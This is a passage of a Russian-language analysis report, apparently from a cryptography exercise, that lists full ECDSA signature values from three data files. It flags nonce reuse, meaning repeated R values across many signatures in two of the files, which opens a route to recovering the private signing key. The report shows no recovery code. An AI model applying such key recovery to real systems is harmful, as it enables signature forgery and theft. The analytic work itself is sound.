```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0x088e8e1795854ca18549c68e0395a2bdabea8d0c86d2bc9d
z = 0xa9145750c1f846dd6686881ecc0a3f167a3f35cc650a2912
SHA256(messages) = 0e6c83f12b102548277eb6976b907110f6dc6b283ab723f832f4a170e1ad2413
Сообщений в блоке: 224
```

**Подпись #15**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0xd963b289ef3f0077a1ea695c0e229292e364f16e58328550
z = 0x5159edf554269431f04f89489fef275b1311cfd227333ae4
SHA256(messages) = 7dff45df09d40f5429c80a5a5142c0ed9733244a038a628492720714c3b7f669
Сообщений в блоке: 224
```

---

### air3s.csv (8 подписей)

| # | R (hex) | S (hex) | z (hex) | Msgs |
|---|---------|---------|---------|------|
| 1 | `93d9915c86a2c97e...` | `60ea295338403e4f...` | `832b89270acd6ce3...` | 168 |
| 2 | `41938e2313832973...` | `8f36834cbdd58121...` | `92dec9a5c0830f1e...` | 224 |
| 3 | `c3180ee7cc01efe2...` | `b03cf6c061f6dd6b...` | `445a5c47728acf76...` | 224 |
| 4 | `dcd7c4ec3fd48500...` | `a88e9d0fb7e6c0b3...` | `653a11caf62e01c3...` | 224 |
| 5 | `f0aa7974afe5e091...` | `9b78b3109308c04e...` | `7ae776cfcb23bcb4...` | 224 |
| 6 | `88bbe6ee040001ef...` | `6ec9cf0dcb1eb842...` | `f5f02daccbaf0b8a...` | 224 |
| 7 | `ed019c9dc9233676...` | `1ff109e5d3f85634...` | `656e7fc64f302383...` | 224 |
| 8 | `c057aa265d39290f...` | `c1c674063de37dbc...` | `6f4973a6c3ed2f20...` | 224 |

#### Полные данные air3s.csv

**Подпись #1**
```
R = 0x93d9915c86a2c97eaf99f270ff72669738d90f2c30f5d293
S = 0x60ea295338403e4f56d62151af5965e0b0bfe310d6f51521
z = 0x832b89270acd6ce3cf799f7918d2f503cffcad252745a88d
SHA256(messages) = 63eb8ddc827f9c1a6c033b5d6d7d3fe9465167b74991c3e2a3348d083c446ff7
Сообщений в блоке: 168
```

**Подпись #2**
```
R = 0x41938e2313832973eac3277e7807d8bfff93fc8ee7d8293a
S = 0x8f36834cbdd581217edf4c15a0416d476eb913e028fd1c83
z = 0x92dec9a5c0830f1eee6ace33cdbead2a7ae417db885f6d99
SHA256(messages) = 959e711efab03d77477cbde68314d7dfdb7bb0c44e65cd9fe503811e74d2f380
Сообщений в блоке: 224
```

**Подпись #3**
```
R = 0xc3180ee7cc01efe271130ec3201dd619e3c8eecf05c9a49d
S = 0xb03cf6c061f6dd6bf1b79072703ae2daba9be6be47da033f
z = 0x445a5c47728acf762bdfc81f51bb220c865eaaaf9fcd2ca2
SHA256(messages) = 6f1b945a8ce7fc2c8bda26e169ef4e6592fb88ba0449a2b454edbe16e61c112a
Сообщений в блоке: 224
```

**Подпись #4**
```
R = 0xdcd7c4ec3fd48500872053d20e5b96ae593a0feba8b83bbb
S = 0xa88e9d0fb7e6c0b32160938b6543887c9165a2e8807d94f2
z = 0x653a11caf62e01c3f530118d27c2a47a125d295e3fe38a6a
SHA256(messages) = dbedea8960497dff8c0d7adfaa22d7e947312504ce21ca56d57d64f42027e883
Сообщений в блоке: 224
```

**Подпись #5**
```
R = 0xf0aa7974afe5e091b6c526aa132ad4ea5b7cda87958b3aab
S = 0x9b78b3109308c04e9d3ea98d0a8ee71366cf5cc0dc279847
z = 0x7ae776cfcb23bcb44e091ab725409d294163d06392be5590
SHA256(messages) = b8e509d837ae14ff80d00ba1bb4bcf0d5c1aaaa40b70f0ffe725de52cab06b02
Сообщений в блоке: 224
```

**Подпись #6**
```
R = 0x88bbe6ee040001effe08740536fc25a396f15497d4033ffa
S = 0x6ec9cf0dcb1eb842ab1a6dc42f16723e21849509c7ba07bf
z = 0xf5f02daccbaf0b8a9b0d3a8f520b881e7c559f8a35cbd6b2
SHA256(messages) = 34e6c35b6d374781b32af99dcbb0b075cf16679e7c4194a87defc96e28d68f67
Сообщений в блоке: 224
```

**Подпись #7**
```
R = 0xed019c9dc923367681a8a6dff19fc0fc75dffcde4c723b4d
S = 0x1ff109e5d3f856347301dd3544c5dc76747c9f1dbb2bccb3
z = 0x656e7fc64f3023838be59a6bb3969a8742e380e0f8a1fdc2
SHA256(messages) = 6cfa57e55298b70c270b60aec509cba7c773b3f3a4798e8f8e7a724b985e809f
Сообщений в блоке: 224
```

**Подпись #8**
```
R = 0xc057aa265d39290f722af6176a921fa8aacd3cdfaa7c81d6
S = 0xc1c674063de37dbc93eef7ee04755f156ceef64c043672b3
z = 0x6f4973a6c3ed2f2076797fb8db75d74917878d9f6f587df4
SHA256(messages) = 96aae981139da02b9f5c8fb085597dd12edadeaddbfb43385e0381fa4c6e9e01
Сообщений в блоке: 224
```

---

## Анализ nonce (R значений)

### white_board_1.csv
- Всего подписей: 28
- Уникальных R: 4
- **ОБНАРУЖЕН NONCE REUSE!** (подписи #4-28 имеют одинаковый R)

### white_board_2.csv
- Всего подписей: 15
- Уникальных R: 3
- **ОБНАРУЖЕН NONCE REUSE!** (подписи #3-15 имеют одинаковый R)

### air3s.csv
- Всего подписей: 8
- Уникальных R: 8
- Все R уникальны (RNG исправлен)
